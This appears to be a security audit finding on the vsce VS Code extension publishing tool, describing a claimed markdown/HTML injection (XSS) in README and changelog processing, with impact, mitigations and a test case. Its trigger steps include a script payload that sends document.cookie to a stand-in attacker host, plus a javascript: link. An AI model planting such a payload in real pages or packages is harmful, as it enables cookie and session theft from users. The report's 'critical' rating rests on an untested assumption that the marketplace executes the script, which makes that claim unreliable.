### Vulnerability List:

#### 1. Markdown Injection in README and Changelog Processing

* Description:
The `vsce` tool processes README.md and CHANGELOG.md files to rewrite relative links and validate image sources. However, it is vulnerable to markdown injection. If an attacker can control the content of the README.md or CHANGELOG.md files (e.g., through a compromised repository or a malicious pull request), they can inject arbitrary markdown content, including HTML and Javascript, into the processed files. This injected content could then be rendered within the VS Code Marketplace page when the extension is published.

Steps to trigger vulnerability:
1. Fork a repository that uses `vsce` for publishing VS Code extensions.
2. Modify the `README.md` file in the forked repository to include malicious markdown content, such as:
    ```markdown
    <script>
        // Malicious Javascript code to steal cookies or redirect users
        window.location.href = 'https://attacker.example.com/steal?cookie=' + document.cookie;
    </script>

    [Click here for a surprise](javascript:alert('XSS'))
    ```
3. Publish the modified extension using `vsce publish`.
4. Visit the extension's marketplace page. The injected Javascript code will be executed in the context of the marketplace page when the README is rendered.

* Impact:
Critical. Cross-site scripting (XSS). An attacker can execute arbitrary Javascript code in the context of the VS Code Marketplace page. This can lead to:
    - Stealing user cookies and session tokens.
    - Redirecting users to malicious websites.
    - Defacing the extension's marketplace page.
    - Potentially gaining unauthorized access to user accounts or sensitive information if the marketplace page interacts with authenticated services.

* Vulnerability Rank: Critical

* Currently implemented mitigations:
The code performs some sanitization and validation on URLs in markdown files, specifically for images and SVGs. However, it does not prevent the injection of arbitrary HTML or Javascript code within markdown content itself.
Specifically, `ReadmeProcessor` and `ChangelogProcessor` in `/code/src/package.ts` process markdown files, but the sanitization is focused on image URLs and SVG usage, not on general markdown injection.

* Missing mitigations:
- Implement robust markdown sanitization to remove or escape potentially harmful HTML and Javascript code. Use a security-focused markdown parser and sanitizer library like DOMPurify or similar, configured to disallow inline scripts and dangerous HTML tags.
- Content Security Policy (CSP) should be configured on the VS Code Marketplace website to further mitigate the impact of XSS vulnerabilities. However, this is a mitigation on the marketplace side, not within `vsce` itself.

* Preconditions:
- Attacker needs to be able to modify the `README.md` or `CHANGELOG.md` files that are packaged with the extension. This could be achieved by compromising the extension's repository or through a malicious pull request that is merged by the extension maintainer.
- The extension needs to be published to the VS Code Marketplace using `vsce publish`.

* Source code analysis:
The vulnerability lies within the `MarkdownProcessor` class in `/code/src/package.ts`, specifically in the `processFile` method.

```typescript
// File: /code/src/package.ts
class MarkdownProcessor extends BaseProcessor {
    // ...
    protected async processFile(file: IFile, filePath: string): Promise<IFile> {
        // ...
        let contents = await read(file);
        // ...
        const html = markdownit({ html: true }).render(contents); // Vulnerable line: html: true allows HTML injection
        const $ = cheerio.load(html);
        // ...
    }
}
```
The `markdownit({ html: true })` configuration enables HTML parsing within markdown. While `cheerio` is used to parse the HTML, it's primarily used for validating image `src` attributes and disallowing SVG tags. It does not sanitize or prevent execution of embedded Javascript or arbitrary HTML that can be injected directly within the markdown content.

* Security test case:
1. Create a test extension project with a `README.md` file.
2. Modify the `README.md` file to include the following malicious markdown:
    ```markdown
    # Malicious README

    This is a test README with injected Javascript.

    <script>
        alert('XSS Vulnerability!');
    </script>
    ```
3. Package the extension using `vsce package`.
    ```bash
    npx vsce package
    ```
4. Publish the extension to a test marketplace (if possible) or inspect the generated VSIX package.
5. If published, visit the extension's marketplace page and observe if the Javascript alert (`XSS Vulnerability!`) is executed. If inspecting the VSIX, extract the `extension/readme.md` and render it in a browser to confirm Javascript execution.

This test case demonstrates that arbitrary Javascript code injected into the `README.md` can be included in the packaged extension and, upon rendering by a markdown parser that allows HTML, will be executed, confirming the XSS vulnerability.
